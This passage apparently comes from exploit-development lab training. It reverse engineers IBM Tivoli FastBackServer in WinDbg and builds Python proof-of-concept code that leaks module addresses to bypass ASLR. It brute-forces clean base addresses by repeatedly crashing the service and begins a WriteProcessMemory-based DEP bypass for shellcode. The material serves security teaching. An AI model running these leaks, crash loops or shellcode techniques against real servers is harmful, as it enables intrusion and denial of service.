+0db5da8c  "WriteProcessMemory"
+Listing 16 - WriteProcessMemory as input to SymGetSymFromName
+This reveals the expected input string, "WriteProcessMemory".
+Before executing SymGetSymFromName, we'll dump the contents of the address field in the PIMAGEHLP_SYMBOL structure.
+0:079> dd esp+8 L1
+0db5da38  0db5dca0
 
-```
+0:079> dds 0db5dca0+4 L1
+0db5dca4  00000000
 
+0:079> p
+eax=00000001 ebx=0608c418 ecx=36be0505 edx=00020b40 esi=0608c418 edi=00669360
+eip=0057e98a esp=0db5da3c ebp=0db5e320 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!FXCLI_DebugDispatch+0xe0a:
+0057e98a 898574f9ffff    mov     dword ptr [ebp-68Ch],eax ss:0023:0db5dc94=00000001
 
-```nasm
+0:079> dds 0db5dca0+4 L1
+0db5dca4  75342890 KERNEL32!WriteProcessMemoryStub
+Listing 17 - Resolving WriteProcessMemory with SymGetSymFromName
+When we inspect the contents of the second field in the PIMAGEHLP_SYMBOL structure before the call, we find it is empty (0x000000).
+However, after the call to SymGetSymFromName, we notice that it has been populated by the API and contains the address of WriteProcessMemory.
+From our last test, it seems that we should be able to abuse the FXCLI_DebugDispatch function. However, we still have to determine if we are able to read the results returned by SymGetSymFromName from the network. If we can, we should be able to bypass ASLR and combine that with a DEP bypass through ROP to obtain code execution.
+Exercises
+1.	Repeat the analysis leading to the execution of SymGetSymFromFile.
+2.	Craft a proof of concept that resolves WriteProcessMemory and verify that it works by setting a breakpoint on the call to SymGetSymFromFile.
+1 (Microsoft, 2020), https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strlen-wcslen-mbslen-mbslen-l-mbstrlen-mbstrlen-l?view=msvc-160
+2 (Microsoft, 2020), https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strnicmp-wcsnicmp-mbsnicmp-strnicmp-l-wcsnicmp-l-mbsnicmp-l?view=msvc-160
+3 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/dbghelp/nf-dbghelp-symgetsymfromname
+4 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/api/dbghelp/ns-dbghelp-imagehlp_symbol
+10.2.3. Returning the Goods
+We know that we can trigger the execution of SymGetSymFromName through FXCLI_DebugDispatch and resolve the address of an arbitrary function. Next, we need to figure out how to retrieve the values.
+Our input triggers SymGetSymFromName through a network packet. It makes sense that, for the functionality to be useful, there will be a code path that returns the value to us. To find this code path, we must continue our reverse engineering effort.
+First, we must navigate our way out of the FXCLI_DebugDispatch function. Let's inspect the return value of SymGetSymFromName to determine which path is taken next.
+0:077> r eax
+eax=00000001
 
-```
+0:077> p
+eax=00000001 ebx=0608c418 ecx=36be0505 edx=00020b40 esi=0608c418 edi=00669360
+eip=0057e990 esp=0db5da3c ebp=0db5e320 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!FXCLI_DebugDispatch+0xe10:
+0057e990 83bd74f9ffff00  cmp     dword ptr [ebp-68Ch],0 ss:0023:0db5dc94=00000001
 
+0:077> p
+eax=00000001 ebx=0608c418 ecx=36be0505 edx=00020b40 esi=0608c418 edi=00669360
+eip=0057e997 esp=0db5da3c ebp=0db5e320 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!FXCLI_DebugDispatch+0xe17:
+0057e997 0f8495060000    je      FastBackServer!FXCLI_DebugDispatch+0x14b2 (0057f032) [br=0]
+Listing 18 - Inspecting the return value from SymGetSymFromName
+The highlighted jump instruction is not executed because the return value is non-null.
+Next, we encounter a large basic block that performs several string manipulations. The first of these manipulations is displayed in Figure 19.
+ 
+Figure 19: String manipulations on output
+We can observe that the output of the sprintf call is stored on the stack at an offset from EBP+arg_0. Two more calls to sprintf follow, where the output is stored at an offset from EBP+arg_0.
+We're only interested in the final string, so we can dump the storage address at EBP+arg_0 and inspect it at the end of the basic block. To find the value of arg_0, we'll first navigate to the start of FXCLI_DebugDispatch.
+ 
+Figure 20: Numerical value of arg_0
+Since arg_0 translates to the value "8", we can dump the contents of EBP+8 at the start of the basic block:
+0:077> dd ebp+8 L1
+0db5e328  00ede3a8
+Listing 19 - Contents of arg_0
+Next, let's set a breakpoint on the TEST instruction at 0x57ea23, which is at the end of the basic block where sprintf is called three times.
+After we hit the breakpoint, we find the final contents of the string buffer.
+0:077> bp 0057ea23
 
-```nasm
+0:077> g
+Breakpoint 0 hit
+eax=ffffffff ebx=0608c418 ecx=0085ea04 edx=0db5db8c esi=0608c418 edi=00669360
+eip=0057ea23 esp=0db5da3c ebp=0db5e320 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!FXCLI_DebugDispatch+0xea3:
+0057ea23 85c0            test    eax,eax
 
-```
+0:077> da 00ede3a8
+00ede3a8  "XpressServer: SymbolOperation .-"
+00ede3c8  "------------------------------ ."
+00ede3e8  "Value of [WriteProcessMemory] is"
+00ede408  ": ..Address is: 0x75342890 .Flag"
+00ede428  "s are: 0x207 .Size is : 0x20 ."
+Listing 20 - Text output from FXCLI_DebugDispatch
+Listing 20 shows that the buffer contains, among other things, the memory address of WriteProcessMemory.
+At this point the execution leads us to the end of the function where we return to FXCLI_OraBR_Exec_Command (address 0x573821, Figure 21) just after the call to FXCLI_DebugDispatch.
+ 
+Figure 21: Return to FXCLI_OraBR_Exec_Command from FXCLI_DebugDispatch
+The first comparison after returning is a NULL check of EAX, which is the return value from FXCLI_DebugDispatch.
+To find the return value, we can let the function return in WinDbg and dump EAX.
+0:077> r eax
+eax=00000001
 
-```nasm
+0:077> p
+eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360
+eip=0057382a esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl nz ac po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
+FastBackServer!FXCLI_OraBR_Exec_Command+0x7374:
+0057382a 83bddcdafeff00  cmp     dword ptr [ebp-12524h],0 ss:0023:0dbad974=00000001
 
-```
+0:077> p
+eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360
+eip=00573831 esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!FXCLI_OraBR_Exec_Command+0x737b:
+00573831 740c            je      FastBackServer!FXCLI_OraBR_Exec_Command+0x7389 (0057383f) [br=0]
 
+0:077> p
+eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360
+eip=00573833 esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!FXCLI_OraBR_Exec_Command+0x737d:
+00573833 c785b4dafeff01000000 mov dword ptr [ebp-1254Ch],1 ss:0023:0dbad94c=00000000
+Listing 21 - Value 1 in temporary variable
+As shown in the listing above, the return value in EAX is 1, so the jump is not taken.
+Following execution, we'll eventually reach the basic block shown in Figure 22.
+ 
+Figure 22: Many code paths leading to basic block
+This figure shows many code paths converging at this address.
+The comparison in this basic block is performed against a variable we do not control. To learn what happens at runtime, we need to single-step in WinDbg until we reach the basic block shown in Figure 22.
+eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360
+eip=00575a62 esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!FXCLI_OraBR_Exec_Command+0x95ac:
+00575a62 83bde4dafeff00  cmp     dword ptr [ebp-1251Ch],0 ss:0023:0dbad97c=00000000
 
-```nasm
+0:077> p
+eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360
+eip=00575a69 esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+FastBackServer!FXCLI_OraBR_Exec_Command+0x95b3:
+00575a69 0f84ec000000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x96a5 (00575b5b) [br=1]
 
-```
+0:077> p
+eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360
+eip=00575b5b esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+FastBackServer!FXCLI_OraBR_Exec_Command+0x96a5:
+00575b5b 83bdb8dafeff00  cmp     dword ptr [ebp-12548h],0 ss:0023:0dbad950=00000001
 
+0:077> p
+eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360
+eip=00575b62 esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!FXCLI_OraBR_Exec_Command+0x96ac:
+00575b62 0f8494010000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x9846 (00575cfc) [br=0]
+Listing 22 - Two comparisons to local variables
+The first jump is taken (as shown in Listing 22), after which we encounter another comparison. This branch also uses a variable that is out of our control, and the second jump is not taken.
+Next, we arrive at the basic block displayed in Figure 23.
+ 
+Figure 23: Basic block with call to FX_AGENT_S_GetConnectedIpPort
+The key point in this block is the call to FX_AGENT_S_GetConnectedIpPort. Keeping in mind our goal of returning the results from SymGetSymFromName to us via a network packet, this function name seems promising.
+Observing this basic block more closely, the addresses in ECX and EDX come from an LEA instruction. When this instruction is used just before a CALL, it typically indicates that the memory address stored in the register (ECX and EDX in this case) is used to return the output of the invoked function. Let's verify this.
+We'll continue to the function call and then dump the memory of the two stack variables pointed to by the LEA instructions, before and after the call.
+eax=0608c8f0 ebx=0608c418 ecx=04fd0020 edx=0dbb9cdc esi=0608c418 edi=00669360
+eip=00575b80 esp=0db5e328 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!FXCLI_OraBR_Exec_Command+0x96ca:
+00575b80 e85cc70000      call    FastBackServer!FX_AGENT_S_GetConnectedIpPort (005822e1)
 
-```nasm
+0:077> dd ebp-12550 L1
+0dbad948  00000000
 
-```
+0:077> dd ebp-61BC L1
+0dbb9cdc  00000000
 
+0:077> p
+eax=00000001 ebx=0608c418 ecx=04fd0020 edx=8eb020d0 esi=0608c418 edi=00669360
+eip=00575b85 esp=0db5e328 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!FXCLI_OraBR_Exec_Command+0x96cf:
+00575b85 83c40c          add     esp,0Ch
 
-```nasm
+0:077> dd ebp-12550 L1
+0dbad948  000020d0
 
-```
+0:077> dd ebp-61BC L1
+0dbb9cdc  7877a8c0
+Listing 23 - Resolving IP and port of Kali
+From Listing 23, we notice that the two memory locations passed as arguments through the LEA instructions are indeed populated during this call. Let's try to understand what these values represent.
+Because of the function's name, we can guess that these values relate to an existing IP address and port. Typically, a TCP connection is created by calling the connect1 API, which has the function prototype shown in Listing 24.
+int WSAAPI connect(
+  SOCKET         s,
+  const sockaddr *name,
+  int            namelen
+);
+Listing 24 - Function prototype for connect
+The second argument in this function prototype is a structure called sockaddr. In IP version 4, this structure is called sockaddr_in.2
+Listing 25 displays the structure of sockaddr_in as documented on MSDN.
+struct sockaddr_in {
+        short   sin_family;
+        u_short sin_port;
+        struct  in_addr sin_addr;
+        char    sin_zero[8];
+};
+Listing 25 - Sockaddr_in structure
+The IP address is represented as a structure of type in_addr, while the port is specified as an unsigned word.
+As shown in Listing 26, the in_addr structure3 represents the IP address with each octet as a single byte. We can obtain the IP address from the second DWORD returned by FX_AGENT_S_GetConnectedIpPort.
+0:077> dd ebp-61BC L1
+0dbb9cdc  7877a8c0
 
+0:005> ? c0;? a8;? 77;? 78
+Evaluate expression: 192 = 000000c0
+Evaluate expression: 168 = 000000a8
+Evaluate expression: 119 = 00000077
+Evaluate expression: 120 = 00000078
+Listing 26 - Locating the IP address
+If each of the bytes are translated from hexadecimal to decimal in reverse order, they reveal the IP address our of Kali Linux machine (192.168.119.120).
+We can also reverse the order of the DWORD and convert it to decimal to reveal the port number, as shown below.
+0:077> dd ebp-12550 L1
+0dbad948  000020d0
 
-```nasm
+0:077> ? d020
+Evaluate expression: 53280 = 0000d020
+Listing 27 - Locating the port number
+Let's verify our findings by opening a command prompt with administrative permissions on the Windows 10 student machine and using the netstat command to list the TCP connections. We'll supply the -anbp flag to show only TCP connections.
+C:\Windows\system32> netstat -anbp tcp
 
-```
+Active Connections
 
+  Proto  Local Address          Foreign Address        State
+...
+  TCP    192.168.120.10:11406  0.0.0.0:0              LISTENING
+ [FastBackServer.exe]
+  TCP    192.168.120.10:11460  0.0.0.0:0              LISTENING
+ [FastBackServer.exe]
+  TCP    192.168.120.10:11460  192.168.119.120:53280  CLOSE_WAIT
+ [FastBackServer.exe]
+...
+Listing 28 - From the output we find the existing TCP connection
+Listing 28 shows that our Kali machine at 192.168.119.120 has an active TCP connection to the Windows 10 client on port 53280, confirming the information we found in WinDbg. This is promising, as we are hoping to receive the output of FXCLI_DebugDispatch through a network packet, and the most logical way to do this from the application perspective is to reuse the TCP connection we created to send our request.
+Let's continue verifying our hypothesis by attempting to locate a function that transmits data.
+After the code providing the IP address and TCP port number, there are a series of checks on the values retrieved by FX_AGENT_S_GetConnectedIpPort. After reaching the basic block shown in Figure 24, we locate the function FXCLI_IF_Buffer_Send.
+ 
+Figure 24: Call to FXCLI_IF_Buffer_Send
+This function name suggests that some data will be sent over the network. Combined with the check for an active connection to our Kali machine, we can guess that the data supplied to this function will be sent to us as a network packet.
+Let's continue our dynamic analysis by single-stepping until the call to FXCLI_IF_Buffer_Send. Then we'll dump the contents of the first function argument.
+eax=00ede3a8 ebx=0608c418 ecx=04fd0020 edx=0000009e esi=0608c418 edi=00669360
+eip=00575d2d esp=0db5e324 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!FXCLI_OraBR_Exec_Command+0x9877:
+00575d2d e8817d0000      call    FastBackServer!FXCLI_IF_Buffer_Send (0057dab3)
 
+0:077> da poi(esp)
+00ede3a8  "XpressServer: SymbolOperation .-"
+00ede3c8  "------------------------------ ."
+00ede3e8  "Value of [WriteProcessMemory] is"
+00ede408  ": ..Address is: 0x75342890 .Flag"
+00ede428  "s are: 0x207 .Size is : 0x20 ."
+Listing 29 - Output from FXCLI_DebugDispatch as an argument
+The text string containing the address of WriteProcessMemory that was returned by FXCLI_DebugDispatch is supplied as an argument to FXCLI_IF_Buffer_Send.
+To confirm data transmission, we could go into the call in search of a call to send. However, it's much easier to instead modify our proof of concept.
+We can update our proof of concept to receive data after sending a request packet as shown in Listing 30.
+def main():
+	if len(sys.argv) != 2:
+		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
+		sys.exit(1)
+	
+	server = sys.argv[1]
+	port = 11460
 
-```nasm
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((server, port))
 
-```
+	s.send(buf)
 
+	response = s.recv(1024)
+	print(response)
 
-```nasm
+	s.close()
 
-```
+	print("[+] Packet sent")
+	sys.exit(0)
+Listing 30 - Proof of concept receiving data
+Listing 30 shows that the proof of concept will print any data received through the recv method to the console.
+To confirm our hypothesis, we'll remove all the breakpoints in WinDbg, let the execution continue, and run the updated proof of concept.
+kali@kali:~$ python3 poc.py 192.168.120.10
+b'\x00\x00\x00\x9eXpressServer: SymbolOperation \n------------------------------- \nValue of [WriteProcessMemory] is: \n\nAddress is: 0x75342890 \nFlags are: 0x207 \nSize is : 0x20 \n'
+[+] Packet sent
+Listing 31 - Receiving FXCLI_DebugDispatch output
+Listing 31 shows that we have received the output from FXCLI_DebugDispatch, which includes the address for WriteProcessMemory. At this point we have implemented a rudimentary ASLR bypass. Excellent!
+Finally, we'll filter the data to only print the address. We can do this by searching for the string "Address is:", as shown in Listing 32.
+def parseResponse(response):
+    """ Parse a server response and extract the leaked address """
+    pattern = b"Address is:"
+    address = None
+    for line in response.split(b"\n"):
+       if line.find(pattern) != -1:
+          address = int((line.split(pattern)[-1].strip()),16)
+    if not address:
+       print("[-] Could not find the address in the Response")
+       sys.exit()
+    return address
+Listing 32 - Updated proof of concept to filter the address
+To make the code more readable and modular, we placed the parsing code inside a separate function called parseResponse.
+Inside this method, we locate the address by splitting the response by newlines and searching for the "Address is:" string.
+Once the string is found, our code extracts the address and converts it to hexadecimal.
+Finally, we'll call parseResponse from the main method, supply the response packet as an argument, and print the results to the console.
+kali@kali:~$ python3 poc.py 192.168.120.10
+0x75342890
+[+] Packet sent
+Listing 33 - Results from running the updated proof of concept
+Listing 33 shows that we received the clean address of WriteProcessMemory.
+Occasionally, when running our proof of concept, we fail to resolve the address of WriteProcessMemory. This is why the parseResponse method checks for a populated address variable. If our proof of concept fails, as it does in Listing 34, we can rerun it until it succeeds.
+kali@kali:~$ python3 poc.py 192.168.120.10
+[-] Could not find the address in the Response
+Listing 34 - Failed to resolve address of WriteProcessMemory
+In this section, we have leveraged a logical vulnerability into an ASLR bypass.
+An ASLR bypass like the one we found may be combined with a memory corruption vulnerability to obtain code execution by overcoming both ASLR and DEP. We'll explore these steps in the next section.
+Exercises
+1.	Repeat the analysis to trace our packet after the call to SymGetSymFromName.
+2.	Update the proof of concept to obtain the address of WriteProcessMemory.
+3.	Execute the exploit without WinDbg attached. Can you still bypass ASLR?
+1 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/api/winsock2/nf-winsock2-connect
+2 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/winsock/sockaddr-2
+3 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr
+10.3. Expanding our Exploit (ASLR Bypass)
+In previous sections, we managed to locate a suspicious Win32 API imported by FastBackServer that led to an information disclosure. This leak provides a direct ASLR bypass by resolving and returning the address of any exported function.
+When we resolved the address of WriteProcessMemory, it also gave us a pointer to kernel32.dll, meaning we could use that DLL to locate ROP gadgets. Unfortunately, since every monthly update changes the ROP gadget offsets, our exploit would become dependent on the patch level of Windows.
+We can create a better exploit by leaking the address of a function from one of the IBM modules shipped with FastBackServer, meaning our exploit will only be dependent on the version of Tivoli.
+In the next sections, we will locate a pointer to an IBM module that we can use for ROP gadgets to bypass DEP. As part of the exploit development process, we will also overcome various complications we will encounter.
+10.3.1. Leaking an IBM Module
+In order to proceed, we must first select a good candidate IBM module for our gadgets. To do this, we'll determine the name of the loaded modules as well as their location on the filesystem. Once we decide which module to use, we will leak the address of an exported function using the logical vulnerability. Finally, using the leaked address, we'll gather the base address of the IBM module in order to build our ROP chain dynamically.
+Let's start by enumerating all loaded IBM modules in the process. We can do this in WinDbg by first breaking execution and then using the lm command along with the f flag to list the file paths.
+0:077> lm f
+start    end        module name
+00190000 001cd000   SNFS     C:\Program Files\Tivoli\TSM\FastBack\server\SNFS.dll
+001d0000 001fd000   libcclog C:\Program Files\Tivoli\TSM\FastBack\server\libcclog.dll
+00400000 00c0c000   FastBackServer C:\Program Files\Tivoli\TSM\FastBack\server\FastBackServer.exe
+00c10000 00c47000   CSNCDAV6 C:\Program Files\Tivoli\TSM\FastBack\server\CSNCDAV6.DLL
+00c50000 00c82000   CSMTPAV6 C:\Program Files\Tivoli\TSM\FastBack\server\CSMTPAV6.DLL
+01060000 010d7000   CSFTPAV6 C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL
+010e0000 01113000   snclientapi C:\Program Files\Tivoli\TSM\FastBack\server\snclientapi.dll
+013f0000 01432000   NLS      C:\Program Files\Tivoli\TSM\FastBack\Common\NLS.dll
+01550000 0157b000   gsk8iccs C:\Program Files\ibm\gsk8\lib\gsk8iccs.dll
+015c0000 015fa000   icclib019 C:\Program Files\ibm\gsk8\lib\N\icc\icclib\icclib019.dll
+03240000 03330000   libeay32IBM019 C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll
+...
+Listing 35 - Loaded IBM modules for FastBackServer
+The output in Listing 35 reveals ten IBM DLLs and the FastBackserver executable.
+Next, we need to select a module with an exported function we can resolve that contains desirable gadgets. We must ensure it does not contain 0x00 in the uppermost byte of the base address, which excludes the use of FastBackServer.exe.
+Multiple modules meet these requirements, so we'll start by arbitrarily choosing libeay32IBM019.dll, located in C:\Program Files\ibm\gsk8\lib\N\icc\osslib.
+Next, we need to locate the function we want to resolve. Let's copy libeay32IBM019.dll to our Kali Linux machine and load it into IDA Pro.
+Once IDA Pro has completed its analysis, we can navigate to the Export tab and pick any function that does not contain a bad character.
+ 
+Figure 25: N98E_CRYPTO_get_net_lockid is exported by libeay32IBM019
+In our case, we'll use the N98E_CRYPTO_get_net_lockid function, which can be found as the first entry when sorting by Address in IDA Pro (Figure 25).
+This function is located at offset 0x14E0 inside the module. Once we leak the function address, we'll need to subtract that offset to get the base address of the DLL.
+Listing 36 displays an updated proof of concept that implements this logic.
+# psCommandBuffer
+symbol = b"SymbolOperationN98E_CRYPTO_get_new_lockid" + b"\x00"
+buf += symbol + b"A" * (100 - len(symbol))
+buf += b"B" * 0x100
+buf += b"C" * 0x100
 
+# Checksum
+buf = pack(">i", len(buf)-4) + buf
 
-```nasm
+def main():
+	if len(sys.argv) != 2:
+		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
+		sys.exit(1)
+	
+	server = sys.argv[1]
+	port = 11460
 
-```
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((server, port))
 
+	s.send(buf)
 
-```nasm
+	response = s.recv(1024)
+	FuncAddr = parseResponse(response)
+	libeay32IBM019Base = FuncAddr - 0x14E0
+	print(str(hex(libeay32IBM019Base)))
 
-```
+	s.close()
 
+	print("[+] Packet sent")
+	sys.exit(0)
 
-```nasm
+if __name__ == "__main__":
+ 	main()
+Listing 36 - Proof of concept to leak the base address of libeay32IBM019B
+We can test our updated exploit by continuing execution within WinDbg and launching our proof of concept. Our exploit's results are shown below.
+kali@kali:~$ python3 poc.py 192.168.120.10                                         
+0x03240000                                                                             
+[+] Packet sent  
+Listing 37 - Leaking the base address of libeay32IBM019
+We have successfully leaked the base address of the IBM module. Very nice!
+Next, we need to locate gadgets within it that we can use for a ROP chain to bypass DEP. Bad characters can be problematic at this point, so we'll deal with these in the next section.
+Exercises
+1.	Implement a proof of concept to leak the base address of libeay32IBM019.
+2.	Modify the proof of concept to leak the base address of a different IBM module.
+3.	Use rp++ to generate a file containing gadgets.
+4.	Modify the proof of concept to be more modular with a separate function (leakFuncAddr) for leaking the address of a given symbol. Use that to leak the address of both WriteProcessMemory and libeay32IBM019.
+10.3.2. Is That a Bad Character?
+Our current exploit leverages a logical vulnerability to disclose the address of an IBM module's exported function, as well as the module's base address. Before moving forward with our exploit development, we must ensure that the selected module's base address does not contain bad characters.
+In a previous module, we exploited a memory corruption vulnerability triggered through opcode 0x534 in FastBackServer. We determined during exploit development that the characters 0x00, 0x09, 0x0A, 0x0C, 0x0D, and 0x20 break our exploit by truncating the buffer.
+The vulnerability is present due to unsanitized input to the scanf call. Since we will be leveraging that vulnerability again, we need to avoid the same bad characters in our updated exploit.
+Keeping this in mind, we can start by checking for bad characters in the base address of the selected module. We can do this by executing the ASLR disclosure multiple times across application restarts and inspecting the upper two bytes of the module base address.
+After multiple tests, we observe that there is a small risk that the base address of libeay32IBM019 will contain a bad character due to ASLR randomization.
+One such occurrence is illustrated in Listing 38.
+kali@kali:~$ python3 poc.py 192.168.120.10
+0x3200000
+[+] Packet sent
+Listing 38 - Finding bad characters in base address of libeay32IBM019
+In the listing above, the second-to-highest byte contains the value 0x20, which is a bad character.
+If we use this base address to set up a ROP chain, along with the relevant gadget offsets, the bad character will truncate the buffer and the exploit attempt will fail. We must pick a different module, or risk a denial-of-service condition while trying to leverage the vulnerability. In our case, we may have another option.
+To provide greater reliability, some server-side enterprise suites run a service that monitors its applications, and can take action if one of them crashes. If the service detects a crash, it will restart the process, ensuring that the application remains accessible.
+When the process restarts, ASLR will randomize the base address of the module. This provides an opportunity for the attacker, as there is a chance that the new randomized address is clean. Since we can typically "restart" the application an arbitrary number of times, we can effectively perform a brute force attack until we encounter a good address.
+The associated services for Tivoli are shown in Figure 26.
+ 
+Figure 26: Four services for Tivoli
+The FastBack WatchDog service seems promising as its name suggests some sort of process monitoring.
+To verify this, we'll use Process Monitor1 (ProcMon), which, among other things, can monitor process creation. We'll open ProcMon.exe as an administrator from C:\Tools\SysInternalsSuite and navigate to Filter > Filter... to open the process monitor filter window.
+Let's set up a filter rule by selecting Operation in the first column and contains in the second column. We'll enter "Process" as the term to include, as shown in Figure 27. With this search we are filtering entries such as "Process Start", "Process Exit", etc.
+ 
+Figure 27: Process Monitor filter
+Once the rule is configured, we'll Add it, Apply it, and enable it with OK.
+Next, we can observe what happens when FastBackServer crashes. We'll simulate a crash by attaching WinDbg to the process and then closing WinDbg. Eventually, FastBackServer is restarted, as shown in Figure 28.
+ 
+Figure 28: FastBackServer is being restarted automatically
+Once the process restarts, we'll resend the packet that calls FXCLI_DebugDispatch and observe the new base address, which does not contain the bad character.
+kali@kali:~$ python3 poc.py 192.168.120.10
+0x31f0000
+[+] Packet sent
+Listing 39 - Bad characters in base address of libeay32IBM019 are gone
+Excellent! We can get a clean base address for libeay32IBM019 by repeatedly crashing FastBackServer, abusing its automatic restart.
+After FastBackServer crashes, the new instance may not be ready to accept network connections for several minutes.
+At this point, we've bypassed ASLR and dealt with the issue of bad characters. Next, we'll combine these skills and leverage a DEP bypass to obtain code execution.
+Exercises
+1.	Repeat the analysis to identify the automatic process restart.
+2.	Implement a proof of concept that will leak the base address of libeay32IBM019 and identify any bad characters.
+3.	In the case of bad characters, implement a routine that crashes FastBackServer (using the buffer overflow vulnerability triggered with opcode 0x534) and detects when the service is back online.
+4.	Automate the process of brute forcing the bad characters to obtain a clean base address that works with the exploit.
+1 (Microsoft, 2019), https://docs.microsoft.com/en-us/sysinternals/downloads/procmon
+10.4. Bypassing DEP with WriteProcessMemory
+Now that ASLR is taken care of, we need to bypass DEP. In a previous module, we did this by modifying the memory protections of the stack where the shellcode resides.
+Earlier, we used VirtualAlloc to bypass DEP. That technique still applies, but we will expand our ROP skills by taking a different approach.
+We can copy our shellcode from the stack into a pre-allocated module's code page through the Win32 WriteProcessMemory1 API.
+In our case, we'll copy our shellcode into the code page of libeay32IBM019. The code page is already executable, so we won't violate DEP when the shellcode is executed from there.
+A typical code page is not writable, but WriteProcessMemory takes care of this by making the target memory page writable before the copy, then reverting the memory protections after the copy.
+In the next sections we'll unpack the API's required arguments and create a ROP chain that calls it.
+1 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
+10.4.1. WriteProcessMemory
+Our current goal is to abuse WriteProcessMemory to bypass DEP and gain code execution inside the code section of libeay32IBM019. However, before we create a ROP chain to call WriteProcessMemory, we need to understand what arguments it accepts.
+In Listing 40, we find the function prototype from MSDN.
+BOOL WriteProcessMemory(
+  HANDLE  hProcess,
+  LPVOID  lpBaseAddress,
+  LPCVOID lpBuffer,
+  SIZE_T  nSize,
+  SIZE_T  *lpNumberOfBytesWritten
+);
+Listing 40 - WriteProcessMemory function prototype
+The first argument, hProcess, is a handle to the process we want to interact with. Since we want to perform a copy operation inside the current process, we'll supply a pseudo handle. The pseudo handle is a special constant currently set to -1.1 When the API is invoked, it translates the pseudo handle to the actual process handle and allows us to effectively ignore this argument.
+The second argument, lpBaseAddress, is the absolute memory address inside the code section where we want our shellcode to be copied. In principle, this address could be anywhere inside the code section because it has the correct memory protections, but overwriting existing code could cause the application to crash.
+To avoid crashing the application, we need to locate unused memory inside the code section and copy our shellcode there. When the code for an application is compiled, the code page of the resulting binary must be page-aligned. If the compiled opcodes do not exactly fill the last used page, it will be padded with null bytes.
+Exploit developers refer to this padded area as a code cave. The easiest way to find a code cave is to search for null bytes at the end of a code section's upper bounds. Let's begin our search by navigating the PE header2 to locate the start of the code pages.
+We'll use WinDbg to find the code cave, so let's attach it to FastBackServer and pause execution.
+As we learned in a previous module, we can find the offset to the PE header by dumping the DWORD at offset 0x3C from the MZ header. Next, we'll add 0x2C to the offset to find the offset to the code section, as shown in Listing 41.
+0:077> dd libeay32IBM019 + 3c L1
+031f003c  00000108
 
-```
+0:077> dd libeay32IBM019 + 108 + 2c L1
+031f0134  00001000
 
-```nasm
+0:077> ? libeay32IBM019 + 1000
+Evaluate expression: 52367360 = 031f1000
+Listing 41 - Starting address of libeay32IBM019 code page
+Let's use the !address command to collect information about the code section.
+0:077> !address 031f1000
 
-```
+Usage:                  Image
+Base Address:           031f1000
+End Address:            03283000
+Region Size:            00092000 ( 584.000 kB)
+State:                  00001000          MEM_COMMIT
+Protect:                00000020          PAGE_EXECUTE_READ
+Type:                   01000000          MEM_IMAGE
+Allocation Base:        031f0000
+Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY
+...
+Listing 42 - Upper bounds of code section
